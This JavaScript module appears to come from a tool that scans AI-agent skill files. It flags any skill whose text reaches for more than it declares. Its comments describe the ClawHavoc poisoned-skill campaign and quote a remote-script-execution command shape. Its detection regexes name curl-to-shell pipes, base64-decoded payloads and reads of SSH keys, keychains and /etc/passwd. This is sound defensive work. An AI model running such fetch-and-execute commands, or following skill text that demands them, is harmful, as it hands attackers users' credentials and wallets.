// skill.mjs — READ A SKILL, AND SAY WHAT IT ACTUALLY REACHES FOR.
//
// A skill is a Markdown file with YAML frontmatter that an agent is told to follow. That sentence is
// the whole security problem: THE TEXT IS THE EXECUTABLE. Signing it proves who wrote it, which is
// why 341 validly-published skills stole keychains anyway; the paper that formalises this states
// plainly that signing verifies authorship and not behaviour, and reports a negative result for
// static information-flow analysis — on their corpus it caught nothing pattern matching did not.
//
// So openkonomi does not ask "who signed this". It asks: WHAT DOES THIS TEXT ASK FOR, and does that
// match WHAT IT DECLARED? ClawHavoc is caught by exactly that question. Those skills were not
// malicious in their code — they were named `solana-wallet-tracker`, declared almost nothing, and
// their *prerequisites* told you to paste a base64'd `curl | bash` into a terminal, which fetched
// Atomic Stealer and took the keychain, the browsers, 60+ wallets and the SSH keys. A skill that
// declares no network and no shell, while instructing you to pipe a remote script into bash, is not
// a judgement call. It is a contradiction, and a contradiction can be refused by a machine.
//
// This file is deliberately SKILL.md-compatible — the same frontmatter ClawHub publishes — so the
// ~10,700 skills already in the world can be read without being rewritten. openkonomi eats the
// existing ecosystem and refuses the part of it that lies.
import { RESOURCES, grant, need } from './capability.mjs';

// ── the frontmatter ──────────────────────────────────────────────────────────────────────────────
//
// A deliberately small YAML reader: the real schema is flat (name, description, version) plus one
// nested `metadata` block, and a full YAML parser is a large attack surface to add to a security
// tool. Anything it cannot read it REPORTS rather than skipping — a field silently ignored is a
// declaration the author thinks they made.
export function parse(text) {
  const src = String(text == null ? '' : text);
  const m = src.match(/^﻿?---\r?\n([\s\S]*?)\r?\n---\r?\n?([\s\S]*)$/);
  if (!m) return { ok: false, why: 'no YAML frontmatter delimited by --- lines', front: {}, body: src, unread: [] };

  // Deliberately four cases and no more. An earlier draft tracked list state alongside the object
  // stack and re-defined properties as it went; the mutation gate found fourteen branches in it that
  // nothing could distinguish, which is the sign of complexity that exists only to be complex — in a
  // file whose whole job is to be checkable, that is a defect. This version holds one stack, and the
  // key most recently seen, and that is enough for the real schema.
  const front = {}, unread = [];
  const stack = [{ indent: -1, obj: front }];
  let pending = null;                 // a key whose value has not appeared yet — it may become a list

  for (const raw of m[1].split('\n')) {
    const line = raw.replace(/\r$/, '');
    if (!line.trim() || /^\s*#/.test(line)) continue;

    // "- item" belongs to the key that was left open above it.
    const item = line.match(/^\s*-\s+(.+)$/);
    if (item) {
      if (!pending) { unread.push(line.trim().slice(0, 120)); continue; }
      if (!Array.isArray(pending.parent[pending.key])) pending.parent[pending.key] = [];
      pending.parent[pending.key].push(unquote(item[1]));
      continue;
    }

    const kv = line.match(/^(\s*)([A-Za-z0-9_.-]+):\s*(.*)$/);
    if (!kv) { unread.push(line.trim().slice(0, 120)); continue; }

    const indent = kv[1].length, key = kv[2], val = kv[3].trim();
    while (stack.length > 1 && indent <= stack[stack.length - 1].indent) stack.pop();
    const parent = stack[stack.length - 1].obj;

    if (val === '|' || val === '>') {
      // Block scalars are the one construct that can hide a payload from a line-oriented reader, so
      // they are refused loudly rather than parsed badly.
      unread.push(`${key}: block scalars are not read`);
      pending = null;
    } else if (!val) {
      // A key with nothing after it is either a nested block or a list. Which one is decided by the
      // NEXT line, so the key is remembered and the decision deferred rather than guessed.
      const child = {};
      parent[key] = child;
      stack.push({ indent, obj: child });
      pending = { parent, key };
    } else if (val.startsWith('[')) {
      parent[key] = val.replace(/^\[|\]$/g, '').split(',').map(s => unquote(s)).filter(Boolean);
      pending = null;
    } else {
      parent[key] = unquote(val);
      pending = null;
    }
  }
  return { ok: true, why: '', front, body: m[2], unread };
}

const unquote = (s) => String(s).trim().replace(/^["']|["']$/g, '').trim();

// ── what the text asks for ───────────────────────────────────────────────────────────────────────
//
// Each signal names a resource, the level it implies, and the literal evidence — so every finding can
// be checked against the visitor's own file rather than taken on trust. Same rule as the rest of the
// estate: the quote is shown, never just the count.
export const SIGNALS = [
  { resource: 'shell', level: 'admin', label: 'pipes a download straight into a shell', re: /(curl|wget)[^\n|]{0,200}\|\s*(sudo\s+)?(ba|z|fi|)sh/i },
  // ⚑ THE ACTUAL ClawHavoc LINE. Written against the real payload rather than the shape people
  // describe it as: the published skills did NOT use `curl | bash`, they used
  // `/bin/bash -c "$(curl -fsSL http://<ip>/<blob>)"` — a command substitution executed by a shell.
  // The pipe rule above misses it completely, which is how a rule that "obviously covers curl-to-bash"
  // covers none of the campaign it was written for.
  { resource: 'shell', level: 'admin', label: 'executes the output of a remote command', re: /(ba|z|fi|)sh\s+-c\s*["']?\s*\$\(|\$\(\s*(curl|wget)\b/i },
  { resource: 'shell', level: 'admin', label: 'decodes and runs an obfuscated payload', re: /base64\s+(-d|--decode|-D)[^\n]{0,80}\|\s*(ba|z|)sh|eval\s*\(?\s*\$\(/i },
  { resource: 'network', level: 'write', label: 'contacts a bare IP address', re: /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/ },
  { resource: 'network', level: 'read', label: 'fetches over the network', re: /\b(curl|wget|fetch\(|https?:\/\/)/i },
  { resource: 'shell', level: 'write', label: 'runs shell commands', re: /```(ba|z|)sh|\bsudo\b|\bchmod\b|\bosascript\b|\/bin\/(ba|z|)sh\b/i },
  { resource: 'filesystem', level: 'admin', label: 'deletes or overwrites files', re: /\brm\s+-[rf]|>\s*\/|\bmv\s+\/|\btruncate\b/i },
  { resource: 'filesystem', level: 'read', label: 'reads sensitive paths', re: /~\/\.(ssh|aws|config|openclaw|claude)|\/etc\/passwd|Keychain|id_rsa|\.env\b/i },
  { resource: 'filesystem', level: 'read', label: 'reads or writes files', re: /\b(cat|less|head|tail|open|readFile|writeFile)\b|\.\/[\w.-]+\.(json|md|txt|ya?ml)/i },
  { resource: 'env', level: 'read', label: 'reads environment variables', re: /\$\{?[A-Z][A-Z0-9_]{2,}\}?|\bprocess\.env\b|\bexport\s+[A-Z]/ },
  { resource: 'clipboard', level: 'write', label: 'touches the clipboard', re: /\bpbcopy\b|\bpbpaste\b|\bclipboard\b|\bxclip\b/i },
  { resource: 'browser', level: 'write', label: 'drives a browser', re: /\bplaywright\b|\bpuppeteer\b|\bselenium\b|\bchrome\s+--headless/i },
  { resource: 'database', level: 'write', label: 'issues database statements', re: /\b(SELECT|INSERT|UPDATE|DELETE|DROP)\s+[A-Za-z*]/ },
  { resource: 'skill_invoke', level: 'write', label: 'calls other skills', re: /\bskill:\/\/|\binvoke_skill\b|\brun\s+skill\b/i },
];

/** Every signal the text fires, with the exact snippet that fired it. */
export function reaches(text) {
  const src = String(text == null ? '' : text);
  const found = [];
  for (const s of SIGNALS) {
    const m = src.match(s.re);
    if (m) found.push({ resource: s.resource, level: s.level, label: s.label, evidence: String(m[0]).trim().slice(0, 100) });
  }
  return found;
}

// ── what it says it needs ────────────────────────────────────────────────────────────────────────
//
// Read from BOTH the openkonomi block (explicit capabilities, the honest way) and the existing
// ClawHub `requires` block (env / bins / anyBins / config), so a skill written for the other
// ecosystem still gets credit for what it did declare. Declaring `bins: [curl]` is an admission of
// network and shell, and it is counted as one.
export function declared(front) {
  const meta = (front && (front.metadata?.openkonomi || front.metadata?.openclaw || front.metadata?.clawdbot)) || {};
  const caps = {};
  for (const [r, lvl] of Object.entries(meta.caps || {})) if (RESOURCES.includes(r)) caps[r] = lvl;

  const req = meta.requires || {};
  const bins = [...(asList(req.bins)), ...(asList(req.anyBins))];
  const notes = [];
  if (bins.length) {
    notes.push(`requires binaries: ${bins.join(', ')}`);
    if (!caps.shell) caps.shell = 'write';
    if (bins.some(b => /curl|wget|http/i.test(b)) && !caps.network) caps.network = 'read';
  }
  if (asList(req.env).length || meta.primaryEnv) {
    notes.push(`requires environment: ${[...asList(req.env), meta.primaryEnv].filter(Boolean).join(', ')}`);
    if (!caps.env) caps.env = 'read';
  }
  if (asList(req.config).length) {
    notes.push(`reads config: ${asList(req.config).join(', ')}`);
    if (!caps.filesystem) caps.filesystem = 'read';
  }
  return { caps, notes, explicit: Object.keys(meta.caps || {}).length > 0 };
}

const asList = (v) => (Array.isArray(v) ? v : (typeof v === 'string' && v ? [v] : []));

// ── the verdict ──────────────────────────────────────────────────────────────────────────────────

/**
 * Read a skill and decide whether it may run.
 *
 * A skill is ADMITTED only when everything its text reaches for is covered by what it declared, and
 * everything it declared is covered by the grant it would run under. Otherwise it is REFUSED, with
 * every contradiction NAMED — never a count, never a score to be argued with. The list of what does
 * not line up is the product; a percentage would be worse than useless because the one line that
 * matters is the one that pipes a remote script into bash.
 */
export function inspect(text, runningUnder = null) {
  const p = parse(text);
  const front = p.front || {};
  const name = front.name || '(unnamed)';
  const dec = declared(front);
  const asks = reaches(p.body + '\n' + JSON.stringify(front));

  const problems = [];
  if (!p.ok) problems.push({ kind: 'malformed', what: 'frontmatter', why: p.why });
  if (!front.name) problems.push({ kind: 'malformed', what: 'name', why: 'a skill with no name cannot be pinned to a version or a report' });
  if (!front.description) problems.push({ kind: 'malformed', what: 'description', why: 'nothing tells a person what this is for' });
  for (const u of p.unread) problems.push({ kind: 'unread', what: u, why: 'this line was not understood, so it is reported rather than ignored' });

  // THE CONTRADICTION: the text reaches for something the declaration never mentioned.
  const undeclared = [];
  for (const a of asks) {
    const have = dec.caps[a.resource];
    if (!have || rankOf(have) < rankOf(a.level)) {
      undeclared.push({ ...a, declaredAs: have || 'nothing' });
      problems.push({
        kind: 'undeclared',
        what: `${a.resource}:${a.level}`,
        why: `it ${a.label} — declared ${have || 'nothing'} — «${a.evidence}»`,
      });
    }
  }

  // And the second question, only worth asking once the first is clean: is what it declared even
  // inside the grant it would be given?
  const outsideGrant = [];
  if (runningUnder) {
    for (const [r, lvl] of Object.entries(dec.caps)) {
      if (rankOf(runningUnder.caps[r]) < rankOf(lvl)) {
        outsideGrant.push({ resource: r, level: lvl, allowed: runningUnder.caps[r] });
        problems.push({ kind: 'over_grant', what: `${r}:${lvl}`, why: `the grant allows ${runningUnder.caps[r]}` });
      }
    }
  }

  const admitted = problems.length === 0;
  return {
    name, version: front.version || null, description: front.description || null,
    declared: dec.caps, declaredNotes: dec.notes, explicit: dec.explicit,
    reaches: asks, undeclared, outsideGrant, problems, admitted,
    // The sentence a person reads. It never says "probably" — this kernel either found a
    // contradiction or it did not, and it says which.
    verdict: admitted
      ? `ADMITTED — everything ${name} reaches for, it declared.`
      : `REFUSED — ${name} has ${problems.length} problem${problems.length === 1 ? '' : 's'}, listed in full below.`,
    // What running it would actually require, ready to hand to admit().
    needs: asks.map(a => need(a.resource, a.level)),
  };
}

const rankOf = (lvl) => ['none', 'read', 'write', 'admin'].indexOf(String(lvl));

/** The grant a skill would need to run honestly — its own declaration, made into a real grant. */
export function grantFor(inspected, budget = {}) {
  return grant(inspected.declared, budget);
}

export default { parse, SIGNALS, reaches, declared, inspect, grantFor };
